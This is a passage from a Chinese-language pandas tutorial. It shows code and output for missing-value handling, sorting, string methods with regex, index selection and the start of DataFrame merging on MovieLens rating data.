class="line"><span class="function">4         <span class="title">True</span>  <span class="title">False</span>  <span class="title">False</span>  <span class="title">False</span></span></span><br><span class="line"><span class="function">5         <span class="title">True</span>   <span class="title">True</span>  <span class="title">False</span>   <span class="title">True</span></span></span><br><span class="line"><span class="function">6         <span class="title">True</span>   <span class="title">True</span>  <span class="title">False</span>  <span class="title">False</span></span></span><br><span class="line"><span class="function">7         <span class="title">True</span>   <span class="title">True</span>   <span class="title">True</span>   <span class="title">True</span></span></span><br><span class="line"><span class="function">8         <span class="title">True</span>  <span class="title">False</span>  <span class="title">False</span>  <span class="title">False</span></span></span><br><span class="line"><span class="function">9         <span class="title">True</span>   <span class="title">True</span>  <span class="title">False</span>  <span class="title">False</span></span></span><br><span class="line"><span class="function">10        <span class="title">True</span>   <span class="title">True</span>  <span class="title">False</span>  <span class="title">False</span></span></span><br></pre></td></tr></table></figure><h3 id="2-2-dropna示例"><a href="#2-2-dropna示例" class="headerlink" title="2.2 dropna示例"></a>2.2 dropna示例</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除全为空的行和列</span></span><br><span class="line">studf.dropna(axis=<span class="number">1</span>, how=<span class="string">&#x27;all&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">studf.dropna(axis=<span class="number">0</span>, how=<span class="string">&#x27;all&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(studf)</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     姓名  科目    分数</span><br><span class="line"><span class="number">0</span>    小明  语文  <span class="number">85</span>.<span class="number">0</span></span><br><span class="line"><span class="number">1</span>   NaN  数学  <span class="number">80</span>.<span class="number">0</span></span><br><span class="line"><span class="number">2</span>   NaN  英语  <span class="number">90</span>.<span class="number">0</span></span><br><span class="line"><span class="number">4</span>    小王  语文  <span class="number">85</span>.<span class="number">0</span></span><br><span class="line"><span class="number">5</span>   NaN  数学   NaN</span><br><span class="line"><span class="number">6</span>   NaN  英语  <span class="number">90</span>.<span class="number">0</span></span><br><span class="line"><span class="number">8</span>    小刚  语文  <span class="number">85</span>.<span class="number">0</span></span><br><span class="line"><span class="number">9</span>   NaN  数学  <span class="number">80</span>.<span class="number">0</span></span><br><span class="line"><span class="number">10</span>  NaN  英语  <span class="number">90</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="2-3-fillna示例"><a href="#2-3-fillna示例" class="headerlink" title="2.3 fillna示例"></a>2.3 fillna示例</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将空的分数填充为0</span></span><br><span class="line"><span class="comment"># 将空的姓名填充为上一个值</span></span><br><span class="line">studf[<span class="string">&#x27;分数&#x27;</span>].fillna(value=<span class="number">0</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">studf[<span class="string">&#x27;姓名&#x27;</span>].fillna(method=<span class="string">&#x27;ffill&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(studf)</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    姓名  科目    分数</span><br><span class="line"><span class="number">0</span>   小明  语文  <span class="number">85</span>.<span class="number">0</span></span><br><span class="line"><span class="number">1</span>   小明  数学  <span class="number">80</span>.<span class="number">0</span></span><br><span class="line"><span class="number">2</span>   小明  英语  <span class="number">90</span>.<span class="number">0</span></span><br><span class="line"><span class="number">4</span>   小王  语文  <span class="number">85</span>.<span class="number">0</span></span><br><span class="line"><span class="number">5</span>   小王  数学   <span class="number">0</span>.<span class="number">0</span></span><br><span class="line"><span class="number">6</span>   小王  英语  <span class="number">90</span>.<span class="number">0</span></span><br><span class="line"><span class="number">8</span>   小刚  语文  <span class="number">85</span>.<span class="number">0</span></span><br><span class="line"><span class="number">9</span>   小刚  数学  <span class="number">80</span>.<span class="number">0</span></span><br><span class="line"><span class="number">10</span>  小刚  英语  <span class="number">90</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><h1 id="七、数据排序"><a href="#七、数据排序" class="headerlink" title="七、数据排序"></a>七、数据排序</h1><h2 id="1-排序方法"><a href="#1-排序方法" class="headerlink" title="1. 排序方法"></a>1. 排序方法</h2><p>1) Series的排序：<br>   <strong><em>Series.sort_values(ascending=True, inplace=False)</em></strong><br>   参数说明：</p><ul><li>ascending：默认为True升序排序，为False降序排序</li><li>inplace：是否修改原始Series</li></ul><p>2) DataFrame的排序：<br>   <strong><em>DataFrame.sort_values(by, ascending=True, inplace=False)</em></strong><br>   参数说明：</p><ul><li>by：字符串或者List&lt;字符串&gt;，单列排序或者多列排序</li><li>ascending：bool或者bool的列表，升序还是降序，如果是list对应by的多列</li><li>inplace：是否修改原始DataFrame</li></ul><h2 id="2-排序示例"><a href="#2-排序示例" class="headerlink" title="2. 排序示例"></a>2. 排序示例</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Series的排序</span></span><br><span class="line"><span class="built_in">print</span>(df[<span class="string">&#x27;aqi&#x27;</span>].sort_values())</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ymd</span><br><span class="line"><span class="number">2018</span>-<span class="number">09</span>-<span class="number">29</span>     <span class="number">21</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">10</span>-<span class="number">09</span>     <span class="number">21</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">09</span>-<span class="number">07</span>     <span class="number">22</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">09</span>-<span class="number">30</span>     <span class="number">22</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">10</span>-<span class="number">29</span>     <span class="number">22</span></span><br><span class="line">             ...</span><br><span class="line"><span class="number">2018</span>-<span class="number">11</span>-<span class="number">14</span>    <span class="number">266</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">03</span>-<span class="number">13</span>    <span class="number">287</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">04</span>-<span class="number">02</span>    <span class="number">287</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">03</span>-<span class="number">14</span>    <span class="number">293</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">03</span>-<span class="number">28</span>    <span class="number">387</span></span><br><span class="line"><span class="function">Name: <span class="title">aqi</span>, <span class="title">Length</span>: 365, <span class="title">dtype</span>: <span class="title">int64</span></span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># DataFrame的排序</span></span><br><span class="line">df.sort_values(by=[<span class="string">&#x27;aqi&#x27;</span>, <span class="string">&#x27;bWendu&#x27;</span>], ascending=[<span class="literal">False</span>, <span class="literal">True</span>], inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(df[[<span class="string">&#x27;aqi&#x27;</span>, <span class="string">&#x27;bWendu&#x27;</span>]])</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">            aqi  bWendu</span><br><span class="line">ymd</span><br><span class="line"><span class="number">2018</span>-<span class="number">03</span>-<span class="number">28</span>  <span class="number">387</span>      <span class="number">25</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">03</span>-<span class="number">14</span>  <span class="number">293</span>      <span class="number">15</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">03</span>-<span class="number">13</span>  <span class="number">287</span>      <span class="number">17</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">04</span>-<span class="number">02</span>  <span class="number">287</span>      <span class="number">26</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">11</span>-<span class="number">14</span>  <span class="number">266</span>      <span class="number">13</span></span><br><span class="line">...         ...     ...</span><br><span class="line"><span class="number">2018</span>-<span class="number">10</span>-<span class="number">29</span>   <span class="number">22</span>      <span class="number">15</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">09</span>-<span class="number">30</span>   <span class="number">22</span>      <span class="number">19</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">09</span>-<span class="number">07</span>   <span class="number">22</span>      <span class="number">27</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">10</span>-<span class="number">09</span>   <span class="number">21</span>      <span class="number">15</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">09</span>-<span class="number">29</span>   <span class="number">21</span>      <span class="number">22</span></span><br></pre></td></tr></table></figure><h1 id="八、字符串处理"><a href="#八、字符串处理" class="headerlink" title="八、字符串处理"></a>八、字符串处理</h1><h2 id="0-Pandas的str"><a href="#0-Pandas的str" class="headerlink" title="0. Pandas的str"></a>0. Pandas的str</h2><p><strong><em>Pandas的字符串处理：</em></strong></p><ol><li>使用方法：先获取Series的str属性，然后在属性上调用函数；</li><li>只能在字符串列上使用，不能数字列上使用；</li><li>Dataframe上没有str属性和处理方法</li><li>Series.str并不是Python原生字符串，而是自己的一套方法，不过大部分和原生str很相似；</li></ol><h2 id="1-基础用法"><a href="#1-基础用法" class="headerlink" title="1. 基础用法"></a>1. 基础用法</h2><p>获取str属性，并调用各种方法，如replace, isnumeric, len</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(df[<span class="string">&#x27;wencha_type&#x27;</span>].<span class="built_in">str</span>.<span class="built_in">len</span>())</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ymd</span><br><span class="line"><span class="number">2018</span>-<span class="number">03</span>-<span class="number">28</span>    <span class="number">3</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">03</span>-<span class="number">14</span>    <span class="number">4</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">03</span>-<span class="number">13</span>    <span class="number">3</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">04</span>-<span class="number">02</span>    <span class="number">3</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">11</span>-<span class="number">14</span>    <span class="number">4</span></span><br><span class="line">             ..</span><br><span class="line"><span class="number">2018</span>-<span class="number">10</span>-<span class="number">29</span>    <span class="number">3</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">09</span>-<span class="number">30</span>    <span class="number">4</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">09</span>-<span class="number">07</span>    <span class="number">3</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">10</span>-<span class="number">09</span>    <span class="number">3</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">09</span>-<span class="number">29</span>    <span class="number">3</span></span><br><span class="line"><span class="function">Name: <span class="title">wencha_type</span>, <span class="title">Length</span>: 365, <span class="title">dtype</span>: <span class="title">int64</span></span></span><br></pre></td></tr></table></figure><h2 id="2-条件查询"><a href="#2-条件查询" class="headerlink" title="2. 条件查询"></a>2. 条件查询</h2><p>或使用contains, startswith等得到bool的Series做条件查询</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(df.loc[df[<span class="string">&#x27;tianqi&#x27;</span>].<span class="built_in">str</span>.startswith(<span class="string">&#x27;多云&#x27;</span>), [<span class="string">&#x27;tianqi&#x27;</span>, <span class="string">&#x27;fengxiang&#x27;</span>]])</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">           tianqi fengxiang</span><br><span class="line">ymd</span><br><span class="line"><span class="number">2018</span>-<span class="number">03</span>-<span class="number">28</span>   多云~晴        东风</span><br><span class="line"><span class="number">2018</span>-<span class="number">03</span>-<span class="number">14</span>   多云~阴       东北风</span><br><span class="line"><span class="number">2018</span>-<span class="number">04</span>-<span class="number">02</span>     多云        北风</span><br><span class="line"><span class="number">2018</span>-<span class="number">11</span>-<span class="number">14</span>     多云        南风</span><br><span class="line"><span class="number">2018</span>-<span class="number">11</span>-<span class="number">26</span>     多云       东南风</span><br><span class="line">...           ...       ...</span><br><span class="line"><span class="number">2018</span>-<span class="number">01</span>-<span class="number">25</span>     多云       东北风</span><br><span class="line"><span class="number">2018</span>-<span class="number">10</span>-<span class="number">10</span>   多云~晴       西北风</span><br><span class="line"><span class="number">2018</span>-<span class="number">02</span>-<span class="number">03</span>     多云        北风</span><br><span class="line"><span class="number">2018</span>-<span class="number">09</span>-<span class="number">30</span>     多云       西北风</span><br><span class="line"><span class="number">2018</span>-<span class="number">10</span>-<span class="number">09</span>   多云~晴       西北风</span><br></pre></td></tr></table></figure><h2 id="3-正则表达式"><a href="#3-正则表达式" class="headerlink" title="3. 正则表达式"></a>3. 正则表达式</h2><p>由于Series.str天然支持正则表达式，示例如下：</p><p>匹配字符集合并做替换：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加新列</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_nianyueri</span>(<span class="params">x</span>):</span><br><span class="line">    year,month,day = x[<span class="string">&quot;ymd&quot;</span>].split(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;year&#125;</span>年<span class="subst">&#123;month&#125;</span>月<span class="subst">&#123;day&#125;</span>日&quot;</span></span><br><span class="line">df[<span class="string">&quot;中文日期&quot;</span>] = df.apply(get_nianyueri, axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试将 年 月 日 去除</span></span><br><span class="line">df.loc[:, <span class="string">&#x27;中文日期&#x27;</span>] = df[<span class="string">&#x27;中文日期&#x27;</span>].<span class="built_in">str</span>.replace(<span class="string">&#x27;[年月日]&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(df[<span class="string">&#x27;中文日期&#x27;</span>])</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">86</span>     <span class="number">20180328</span></span><br><span class="line"><span class="number">72</span>     <span class="number">20180314</span></span><br><span class="line"><span class="number">71</span>     <span class="number">20180313</span></span><br><span class="line"><span class="number">91</span>     <span class="number">20180402</span></span><br><span class="line"><span class="number">317</span>    <span class="number">20181114</span></span><br><span class="line">         ...</span><br><span class="line"><span class="number">301</span>    <span class="number">20181029</span></span><br><span class="line"><span class="number">272</span>    <span class="number">20180930</span></span><br><span class="line"><span class="number">249</span>    <span class="number">20180907</span></span><br><span class="line"><span class="number">281</span>    <span class="number">20181009</span></span><br><span class="line"><span class="number">271</span>    <span class="number">20180929</span></span><br><span class="line"><span class="function">Name: 中文日期, <span class="title">Length</span>: 365, <span class="title">dtype</span>: <span class="title">object</span></span></span><br></pre></td></tr></table></figure><p>捕获组提取数据：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extracted_fengli = df[<span class="string">&#x27;fengli&#x27;</span>].<span class="built_in">str</span>.extract(<span class="string">r&#x27;(\d)-(\d)&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(extracted_fengli.head())</span><br></pre></td></tr></table></figure></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">     <span class="number">0</span>  <span class="number">1</span></span><br><span class="line"><span class="number">86</span>   <span class="number">1</span>  <span class="number">2</span></span><br><span class="line"><span class="number">72</span>   <span class="number">1</span>  <span class="number">2</span></span><br><span class="line"><span class="number">71</span>   <span class="number">1</span>  <span class="number">2</span></span><br><span class="line"><span class="number">91</span>   <span class="number">1</span>  <span class="number">2</span></span><br><span class="line"><span class="number">317</span>  <span class="number">1</span>  <span class="number">2</span></span><br><span class="line">..  .. ..</span><br><span class="line"><span class="number">301</span>  <span class="number">3</span>  <span class="number">4</span></span><br><span class="line"><span class="number">272</span>  <span class="number">4</span>  <span class="number">5</span></span><br><span class="line"><span class="number">249</span>  <span class="number">3</span>  <span class="number">4</span></span><br><span class="line"><span class="number">281</span>  <span class="number">4</span>  <span class="number">5</span></span><br><span class="line"><span class="number">271</span>  <span class="number">3</span>  <span class="number">4</span></span><br></pre></td></tr></table></figure><h1 id="九、索引"><a href="#九、索引" class="headerlink" title="九、索引"></a>九、索引</h1><h2 id="0-索引的作用"><a href="#0-索引的作用" class="headerlink" title="0. 索引的作用"></a>0. 索引的作用</h2><p>选择恰当的索引可以加速查询性能</p><ol><li>当索引是<strong>唯一</strong>的时，Pandas会用哈希表优化性能，时间复杂度为O(1)</li><li>当索引不唯一，但是<strong>单调</strong>时，Pandas会使用二分查找，时间复杂度为O(log n)</li><li>当索引既不唯一且不单调时，Pandas只能遍历，时间复杂度为O(n)</li></ol><p>因此，我们要判断当前索引是否为以上类型，尽可能选择唯一的索引，单调次之</p><h2 id="1-选择索引示例"><a href="#1-选择索引示例" class="headerlink" title="1. 选择索引示例"></a>1. 选择索引示例</h2><p>原始数据如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(df.head())</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   userId  movieId  rating  timestamp</span><br><span class="line"><span class="number">0</span>       <span class="number">1</span>        <span class="number">1</span>     <span class="number">4</span>.<span class="number">0</span>  <span class="number">964982703</span></span><br><span class="line"><span class="number">1</span>       <span class="number">1</span>        <span class="number">3</span>     <span class="number">4</span>.<span class="number">0</span>  <span class="number">964981247</span></span><br><span class="line"><span class="number">2</span>       <span class="number">1</span>        <span class="number">6</span>     <span class="number">4</span>.<span class="number">0</span>  <span class="number">964982224</span></span><br><span class="line"><span class="number">3</span>       <span class="number">1</span>       <span class="number">47</span>     <span class="number">5</span>.<span class="number">0</span>  <span class="number">964983815</span></span><br><span class="line"><span class="number">4</span>       <span class="number">1</span>       <span class="number">50</span>     <span class="number">5</span>.<span class="number">0</span>  <span class="number">964982931</span></span><br></pre></td></tr></table></figure><p>判断每一列是否存在唯一约束：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(df.nunique() == <span class="built_in">len</span>(df))</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">userId       False</span><br><span class="line">movieId      False</span><br><span class="line">rating       False</span><br><span class="line">timestamp    False</span><br><span class="line"><span class="function">dtype: <span class="title">bool</span></span></span><br></pre></td></tr></table></figure><p>判断每一列是否单调：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 使用这一句会报FutureWarning</span></span><br><span class="line"><span class="comment"># is_monotonic = df.apply(lambda x: x.is_monotonic)</span></span><br><span class="line"></span><br><span class="line">is_monotonic_increasing = df.apply(<span class="keyword">lambda</span> x: x.is_monotonic_increasing)</span><br><span class="line">is_monotonic_decreasing = df.apply(<span class="keyword">lambda</span> x: x.is_monotonic_decreasing)</span><br><span class="line"><span class="built_in">print</span>(is_monotonic_increasing, <span class="string">&#x27;\n\n&#x27;</span>, is_monotonic_decreasing)</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">userId        True</span><br><span class="line">movieId      False</span><br><span class="line">rating       False</span><br><span class="line">timestamp    False</span><br><span class="line"><span class="function">dtype: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">userId</span>       <span class="title">False</span></span></span><br><span class="line"><span class="function"><span class="title">movieId</span>      <span class="title">False</span></span></span><br><span class="line"><span class="function"><span class="title">rating</span>       <span class="title">False</span></span></span><br><span class="line"><span class="function"><span class="title">timestamp</span>    <span class="title">False</span></span></span><br><span class="line"><span class="function"><span class="title">dtype</span>: <span class="title">bool</span></span></span><br></pre></td></tr></table></figure><h2 id="2-设置索引示例"><a href="#2-设置索引示例" class="headerlink" title="2. 设置索引示例"></a>2. 设置索引示例</h2><p><strong>DataFrame.set_index(keys, append=False, drop=True, inplace=False)</strong></p><p>keys代表被用作索引的列</p><p>append代表是否保留原来的索引</p><p>drop表示是否将指定的列在原数据列中删除</p><p>inplace表示是否在原数据上修改</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df.set_index(<span class="string">&#x27;userId&#x27;</span>,append=<span class="literal">True</span>, drop=<span class="literal">False</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(df.head())</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">          userId  movieId  rating  timestamp</span><br><span class="line">  userId</span><br><span class="line"><span class="number">0</span> <span class="number">1</span>            <span class="number">1</span>        <span class="number">1</span>     <span class="number">4</span>.<span class="number">0</span>  <span class="number">964982703</span></span><br><span class="line"><span class="number">1</span> <span class="number">1</span>            <span class="number">1</span>        <span class="number">3</span>     <span class="number">4</span>.<span class="number">0</span>  <span class="number">964981247</span></span><br><span class="line"><span class="number">2</span> <span class="number">1</span>            <span class="number">1</span>        <span class="number">6</span>     <span class="number">4</span>.<span class="number">0</span>  <span class="number">964982224</span></span><br><span class="line"><span class="number">3</span> <span class="number">1</span>            <span class="number">1</span>       <span class="number">47</span>     <span class="number">5</span>.<span class="number">0</span>  <span class="number">964983815</span></span><br><span class="line"><span class="number">4</span> <span class="number">1</span>            <span class="number">1</span>       <span class="number">50</span>     <span class="number">5</span>.<span class="number">0</span>  <span class="number">964982931</span></span><br></pre></td></tr></table></figure><h1 id="十、数据合并"><a href="#十、数据合并" class="headerlink" title="十、数据合并"></a>十、数据合并</h1><h2 id="1-merge合并"><a href="#1-merge合并" class="headerlink" title="1. merge合并"></a>1. merge合并</h2><h3 id="1-1-函数定义"><a href="#1-1-函数定义" class="headerlink" title="1.1 函数定义"></a>1.1 函数定义</h3><p>课件中给出的<strong>pd.merge</strong>的解释如下：</p><p><strong>pd.merge(left, right, how=‘inner’, on=None, left_on=None, right_on=None,<br>left_index=False, right_index=False, sort=True,<br>suffixes=(‘_x’, ‘_y’), copy=True, indicator=False,<br>validate=None)</strong></p><ul><li>left，right：要merge的dataframe或者有name的Series</li><li>how：join类型，‘left’, ‘right’, ‘outer’, ‘inner’</li><li>on：join的key，left和right都需要有这个key</li><li>left_on：left的df或者series的key</li><li>right_on：right的df或者seires的key</li><li>left_index，right_index：使用index而不是普通的column做join</li><li>suffixes：两个元素的后缀，如果列有重名，自动添加后缀，默认是(‘_x’, ‘_y’)</li></ul><p>如果学过SQL语句，可以很好地将两者对应起来：</p><p>pd.merge(left, right, on=’key’)<br>相当于<br>FROM left JOIN  right ON left.key=right.key</p><p>pd.merge(left, right, left_on=’key1’, right_on=’key2’)<br>相当于<br>FROM left JOIN  right ON left.key1=right.key2</p><p>而how=’left’/‘right’/‘outer’就相当于LEFT/RIGHT/FULL JOIN</p><h3 id="1-2-合并示例"><a href="#1-2-合并示例" class="headerlink" title="1.2 合并示例"></a>1.2 合并示例</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">df_ratings = pd.read_csv(</span><br><span class="line">    <span class="string">&quot;../datas/movielens-1m/ratings.dat&quot;</span>,</span><br><span class="line">    sep=<span class="string">&quot;::&quot;</span>,</span><br><span class="line">    engine=<span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    names=<span class="string">&quot;UserID::MovieID::Rating::Timestamp&quot;</span>.split(<span class="string">&quot;::&quot;</span>)</span><br><span class="line">)</span><br><span class="line">df_users = pd.read_csv(</span><br><span class="line">    <span class="string">&quot;../datas/movielens-1m/users.dat&quot;</span>,</span><br><span class="line">    sep=<span class="string">&quot;::&quot;</span>,</span><br><span class="line">    engine=<span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    names=<span class="string">&quot;UserID::Gender::Age::Occupation::Zip-code&quot;</span>.split(<span class="string">&quot;::&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df_ratings.head(), <span class="string">&#x27;\n&#x27;</span>, df_users.head())</span><br><span class="line"></span><br><span class="line">df_joined1 = pd.merge(df_ratings, df_users, on=<span class="string">&#x27;UserID&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df_joined1.head())</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">   UserID  MovieID  Rating  Timestamp</span><br><span class="line"><span class="number">0</span>       <span class="number">1</span>     <span class="number">1193</span>       <span class="number">5</span>  <span class="number">978300760</span></span><br><span class="line"><span class="number">1</span>       <span class="number">1</span>      <span class="number">661</span>       <span class="number">3</span>  <span class="number">978302109</span></span><br><span class="line"><span class="number">2</span>       <span class="number">1</span>      <span class="number">914</span>       <span class="number">3</span>  <span class="number">978301968</span></span><br><span class="line"><span class="number">3</span>       <span class="number">1</span>     <span class="number">3408</span>       <span class="number">4</span>  